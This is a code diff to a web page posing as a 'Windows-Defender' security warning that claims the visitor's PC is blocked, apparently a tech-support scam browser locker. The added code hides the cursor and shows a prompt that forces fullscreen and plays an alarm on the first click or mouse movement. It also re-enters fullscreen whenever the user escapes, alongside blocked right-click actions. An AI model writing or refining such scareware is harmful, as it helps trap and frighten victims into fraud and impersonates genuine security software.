@@ -13,7 +13,26 @@
       font-family: 'Segoe UI', Arial, sans-serif;
       user-select: none;
       overflow: hidden;
-      /* cursor: none;  Uncomment if you want to hide the cursor */
+      cursor: none;
+    }
+    .fullscreen-prompt {
+      position: fixed;
+      inset: 0;
+      background: #1877d5;
+      color: #fff;
+      z-index: 2000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      font-size: 1.6em;
+      text-align: center;
+      cursor: pointer;
+    }
+    .fullscreen-prompt span {
+      margin-top: 18px;
+      font-size: 0.7em;
+      color: #c8e2ff;
     }
     .overlay-blue {
       position: fixed;
@@ -95,21 +114,26 @@
     // --- FULL SCREEN MANAGEMENT ---
     function goFullscreen() {
       let el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+      if (el.requestFullscreen) return el.requestFullscreen();
+      if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
+      if (el.msRequestFullscreen) return el.msRequestFullscreen();
+    }
+
+    function hidePrompt() {
+      const p = document.getElementById('fs-prompt');
+      if (p) p.style.display = 'none';
     }
 
     // Re-enter fullscreen if exited
-    document.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement) setTimeout(goFullscreen, 100);
-    });
-    document.addEventListener('webkitfullscreenchange', () => {
-      if (!document.webkitIsFullScreen) setTimeout(goFullscreen, 100);
-    });
-    document.addEventListener('msfullscreenchange', () => {
-      if (!document.msFullscreenElement) setTimeout(goFullscreen, 100);
-    });
+    function reEnterFullscreen() {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+        goFullscreen();
+      }
+    }
+
+    document.addEventListener('fullscreenchange', reEnterFullscreen);
+    document.addEventListener('webkitfullscreenchange', reEnterFullscreen);
+    document.addEventListener('msfullscreenchange', reEnterFullscreen);
 
     // --- Block user actions ---
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -141,16 +165,31 @@
         }
       }
     }
-    document.addEventListener('click', playAlert, { once: true });
 
     // --- Initial actions ---
-    window.onload = () => {
+    function triggerFullscreenAndAlert() {
       goFullscreen();
+      hidePrompt();
       playAlert();
+      // Remove listeners after first trigger
+      document.removeEventListener('click', triggerFullscreenAndAlert);
+      document.removeEventListener('mousemove', triggerFullscreenAndAlert);
+    }
+
+    window.onload = () => {
+      // Show prompt; fullscreen must be triggered by user action
+      const prompt = document.getElementById('fs-prompt');
+      prompt.style.display = 'flex';
+      document.addEventListener('click', triggerFullscreenAndAlert);
+      document.addEventListener('mousemove', triggerFullscreenAndAlert);
     };
   </script>
 </head>
 <body>
+  <div id="fs-prompt" class="fullscreen-prompt" style="display:none;">
+    Click or move your mouse anywhere to continue<br>
+    <span>(This site requires fullscreen mode)</span>
+  </div>
   <div class="overlay-blue">
     <b>Windows-Defender - Security Warning</b><br>
     * ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS *<br>
